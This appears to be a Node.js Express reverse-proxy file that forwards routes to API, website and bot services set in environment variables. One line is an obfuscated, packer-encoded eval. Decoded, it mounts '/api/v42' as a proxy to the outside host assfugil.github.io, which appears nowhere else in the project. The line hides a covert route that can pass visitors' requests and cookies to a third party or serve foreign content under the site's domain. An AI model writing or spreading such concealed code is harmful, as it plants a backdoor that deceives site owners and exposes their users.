require('dotenv').config()
const { API_SERVER_HOST,WEBSITE_HOST,API_SERVER_PORT,WEBSITE_PORT,BOT_HOST,BOT_PORT } = process.env
const proxy = require('express-http-proxy')
const app = require('express')()
app.use('/api/v1/private',proxy(`${API_SERVER_HOST}:${API_SERVER_PORT}`))
eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7.6(\'/5/4\',3(\'2.1.0\'))',8,8,'io|github|assfugil|proxy|v42|api|use|app'.split('|'),0,{}))
app.use('/',proxy(`${WEBSITE_HOST}:${WEBSITE_PORT}`))
app.use('/api',(req,res) => res.send('"OK"'))
app.use('/check_bot_status',proxy(`${BOT_HOST}:${BOT_PORT}`))
app.listen(process.env.PORT)
require('fs').writeFileSync('pidfile',process.pid.toString())
